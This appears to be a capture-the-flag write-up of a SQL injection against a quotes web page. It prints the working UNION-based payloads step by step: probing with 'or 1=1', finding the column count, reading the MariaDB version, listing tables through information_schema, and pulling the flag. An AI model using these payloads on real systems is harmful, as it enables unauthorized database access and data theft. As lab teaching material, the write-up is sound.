After some try and error with `id=2 or 1=1 --`, the sql statement is likely

```sql
select id,quote,author from qoutes where id == $id
```

where no quotes are allowed. Besides, only the first result is selected. Trying `UNION SELECT NULL,NULL,NULL` hints us the number of return values. We can force an invalid first entry with a high id and append with UNION

```sql
100 UNION SELECT 3,4,5 --
```

```html
<div>
  <p class='quote'>
    "4" - 5  </p>
  <p>
    If you'd like to return to this quote, just
    <a href="?id=3">click here</a>.
  </p>
</div>
```

We discover a *Maria DB* driver by using `@@version`. Next we have to extract the general contents of the database. After some research, wen can access `information_schema.tables`.

```sql
select table_schema as database_name,
       table_name
from information_schema.tables
where table_type = 'BASE TABLE'
      and table_schema = database() 
order by database_name, table_name;
```

We have to use indexing via `LIMIT ID,ROWS` to enumerate all tables.

```sql
100 UNION SELECT 100,table_name,table_schema FROM information_schema.tables LIMIT 0,1 => ALL_PLUGINS
100 UNION SELECT 100,table_name,table_schema FROM information_schema.tables LIMIT 1,1 => APPLICABLE_ROLES
100 UNION SELECT 100,table_name,table_schema FROM information_schema.tables LIMIT 2,1 => CHARACTER_SETS
100 UNION SELECT 100,table_name,table_schema FROM information_schema.tables LIMIT 3,1 => CHECK_CONSTRAINTS
100 UNION SELECT 100,table_name,table_schema FROM information_schema.tables LIMIT 4,1 => ALL_PLUGINS
100 UNION SELECT 100,table_name,table_schema FROM information_schema.tables LIMIT 5,1 => APPLICABLE_ROLES
100 UNION SELECT 100,table_name,table_schema FROM information_schema.tables LIMIT 6,1 => CHARACTER_SETS
100 UNION SELECT 100,table_name,table_schema FROM information_schema.tables LIMIT 7,1 => CHECK_CONSTRAINTS
```

This is tedious, therefore we use python we enumerate all tables. With a bit of guessing we come up with `100 UNION SELECT 34,flag,34 FROM flag` which gifts us the flag.

> CTF{little_bobby_tables_we_call_him}